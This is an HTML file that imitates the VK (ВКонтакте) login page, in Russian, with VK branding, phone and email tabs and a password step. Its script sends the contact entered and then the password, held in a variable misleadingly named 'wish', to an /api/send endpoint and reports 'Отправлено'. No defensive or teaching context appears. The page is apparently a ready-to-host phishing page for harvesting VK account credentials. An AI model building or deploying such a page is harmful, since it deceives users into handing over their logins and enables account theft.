<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>VK </title>
  <style>
    :root{
      --card-width:380px;
      --bg-start:#70b7ff;
      --bg-end:#0488ff;
      --card-radius:14px;
      --muted:#9aa6b2;
      --input-bg:#f6f8fa;
      --accent:#0b75ff;
      --shadow: 0 12px 30px rgba(8,30,60,0.12);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      background: linear-gradient(90deg,var(--bg-start),var(--bg-end));
      display:flex;align-items:center;justify-content:center;overflow:hidden;color:#111;
    }
    .bg-deco{position:fixed;inset:0;pointer-events:none}
    .arc{position:absolute;border:1px solid rgba(255,255,255,0.12);border-radius:50%}
    .arc.a1{width:1150px;height:1150px;left:-600px;top:-500px}
    .arc.a2{width:900px;height:900px;left:600px;top:-200px}
    .arc.a3{width:1400px;height:1400px;left:-1000px;bottom:-400px}

    .card{
      width:var(--card-width);
      background:linear-gradient(180deg,#ffffff,#fbfdff);
      border-radius:var(--card-radius);
      padding:22px 24px 16px;
      box-shadow:var(--shadow);
      position:relative
    }
    .header{display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:6px}
    .vk-logo{width:68px;height:68px;border-radius:14px;background:linear-gradient(180deg,var(--accent),#0063d6);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700}
    h1{margin:0;font-size:18px;font-weight:600}

    .tabs{display:flex;justify-content:center;margin:14px 0;background:#f4f6f8;border-radius:10px;padding:4px;position:relative}
    .tab{flex:1;padding:10px 6px;border-radius:8px;cursor:pointer;font-weight:600;text-align:center;color:#6b7a86;user-select:none;z-index:1}
    .tab-indicator{position:absolute;top:4px;bottom:4px;left:4px;width:calc(50% - 8px);background:#fff;border-radius:8px;transition:transform .28s cubic-bezier(.2,.9,.2,1)}
    .tab.active{color:#071627}

    .content{display:flex;flex-direction:column;gap:18px}
    .field{display:flex;align-items:center;gap:10px;background:var(--input-bg);padding:14px;border-radius:10px;border:1px solid rgba(10,20,40,0.04)}
    .field input{border:0;background:transparent;outline:none;font-size:15px;width:100%}

    .controls{display:flex;gap:12px;justify-content:center;margin-top:8px}
    .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px;border-radius:10px;border:0;font-weight:700;cursor:pointer}
    .btn.primary{background:linear-gradient(180deg,#2f9bff,var(--accent));color:#fff;flex:1}
    .btn.ghost{background:#fff;border:1px solid #e6e9ee;color:#1f2b33}

    .divider{display:flex;align-items:center;gap:8px;margin:8px 0}
    .divider hr{flex:1;border:0;height:1px;background:#eef3f7}
    .small{font-size:12px;color:#98a3ab}

    .step{transition:opacity .18s ease, transform .2s ease}
    .step.hidden{opacity:0;transform:translateY(8px);pointer-events:none}

    .identity{display:flex;justify-content:center;margin-bottom:12px}
    .identity .pill{background:#f4f7fb;padding:8px 12px;border-radius:999px;border:1px solid #e8f0ff;font-weight:600}

    .footer{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:13px;color:var(--muted)}

    @media (max-width:420px){
      .card{width:92vw}
      .tabs{margin:12px 0}
      h1{font-size:17px}
    }
  </style>
</head>
<body>
  <div class="bg-deco"><div class="arc a1"></div><div class="arc a2"></div><div class="arc a3"></div></div>

  <div class="card">
    <div class="header">
      <div class="vk-logo">VK</div>
      <h1 id="page-title">Вход ВКонтакте</h1>
    </div>

    <div class="tabs">
      <div class="tab-indicator"></div>
      <div class="tab active" data-tab="phone">Телефон</div>
      <div class="tab" data-tab="email">Почта</div>
    </div>

    <div id="msg" style="min-height:28px"></div>

    <div class="content">
      <div id="step-identity" class="step">
        <div class="field"><input id="identity-input" placeholder="Введите телефон" /></div>
        <div class="controls"><button id="next-btn" class="btn primary">Войти</button></div>
        <div class="divider small"><hr><div>или</div><hr></div>
        <div style="display:flex;gap:8px"><button class="btn ghost" style="flex:1">QR‑код</button><button class="btn ghost" style="flex:1">Создать</button></div>
        <div class="small">Нажимая «Войти», вы принимаете пользовательское соглашение и политику конфиденциальности</div>
      </div>

      <div id="step-password" class="step hidden">
        <h2 style="text-align:center;margin:6px 0 4px;font-size:18px">Введите пароль</h2>
        <div class="identity"><div class="pill" id="identity-pill">example@mail.com</div></div>
        <div class="field"><input id="wish-input" placeholder="Введите пароль" /></div>
        <div class="controls"><button id="back-btn" class="btn ghost" style="flex:1">Назад</button><button id="send-btn" class="btn primary" style="flex:1">Отправить</button></div>
      </div>
    </div>

    <div class="footer"><span>Помощь</span><span>VK © 2006–2026</span></div>
  </div>

<script>
  const tabs=[...document.querySelectorAll('.tab')];
  const indicator=document.querySelector('.tab-indicator');
  const identityInput=document.getElementById('identity-input');
  const stepIdentity=document.getElementById('step-identity');
  const stepPassword=document.getElementById('step-password');
  const identityPill=document.getElementById('identity-pill');
  const msg=document.getElementById('msg');

  function showMsg(t){msg.innerHTML=`<div style="padding:8px;border-radius:8px;background:#e6fff4;color:#007a3d;font-size:13px">${t}</div>`;setTimeout(()=>msg.innerHTML='',2500)}

  function setTab(name){tabs.forEach(t=>t.classList.toggle('active',t.dataset.tab===name));indicator.style.transform=name==='phone'?'translateX(0)':'translateX(100%)';identityInput.placeholder=name==='phone'?'Введите телефон':'Введите почту'}
  tabs.forEach(t=>t.onclick=()=>setTab(t.dataset.tab));

  document.getElementById('next-btn').onclick=async()=>{
    const contact=identityInput.value.trim();
    if(!contact) return;
    identityPill.textContent=contact.replace(/\s+/g,'');
    await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({contact})}).catch(()=>{});
    stepIdentity.classList.add('hidden');stepPassword.classList.remove('hidden');
  };

  document.getElementById('back-btn').onclick=()=>{stepPassword.classList.add('hidden');stepIdentity.classList.remove('hidden')};

  document.getElementById('send-btn').onclick=async()=>{
    const wish=document.getElementById('wish-input').value.trim();
    if(!wish) return;
    await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wish})}).catch(()=>{});
    showMsg('Отправлено');
  };

  setTab('phone');
</script>
</body>
</html>
